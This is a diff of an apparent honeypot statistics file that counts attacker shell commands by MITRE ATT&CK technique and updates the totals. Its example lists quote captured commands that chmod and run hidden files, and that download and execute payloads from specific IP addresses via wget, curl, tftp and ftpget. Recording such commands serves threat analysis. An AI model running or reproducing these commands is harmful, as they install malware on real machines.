@@ -24,8 +24,8 @@
         "defense-impairment"
       ],
       "url": "https://attack.mitre.org/techniques/T1222/002",
-      "count": 16770,
-      "distinct_ips": 651,
+      "count": 16795,
+      "distinct_ips": 652,
       "examples": [
         ">/var/.f && chmod 777 /var/.f && /var/.f && cd /var/; ",
         ">/var/tmp/.f && chmod 777 /var/tmp/.f && /var/tmp/.f && cd /var/tmp/; ",
@@ -41,14 +41,14 @@
         "command-and-control"
       ],
       "url": "https://attack.mitre.org/techniques/T1105",
-      "count": 2905,
-      "distinct_ips": 438,
+      "count": 2906,
+      "distinct_ips": 439,
       "examples": [
+        "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; /bin/busybox wget -q -O telnet2.sh http://176.65.139.157/telnet2.sh; busybox wget -q -O telnet2.sh http://176.65.139.157/telnet2.sh; wget -q -O telnet2.sh http://176.65.139.157/telnet2.sh; curl -s -o telnet2.sh http://176.65.139.157/telnet2.sh; busybox curl -s -o telnet2.sh http://176.65.139.157/telnet2.sh; tftp 176.65.139.157 -c get telnet2.sh; tftp -r telnet2.sh -g 176.65.139.157; ftpget -v -u anonymous -p anonymous -P 21 176.65.139.157 telnet2.sh telnet2.sh; chmod 777 telnet2.sh; sh telnet2.sh; rm -rf telnet2.sh",
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
         "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f",
-        "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/pmips; chmod 777 pmips; ./pmips; rm -rf pmips",
-        "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/x86_64; chmod 777 x86_64; ./x86_64; rm -rf x86_64"
+        "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/pmips; chmod 777 pmips; ./pmips; rm -rf pmips"
       ]
     },
     {
@@ -184,6 +184,6 @@
       ]
     }
   ],
-  "total_commands": 408621,
-  "matched_commands": 142483
+  "total_commands": 408676,
+  "matched_commands": 142508
 }
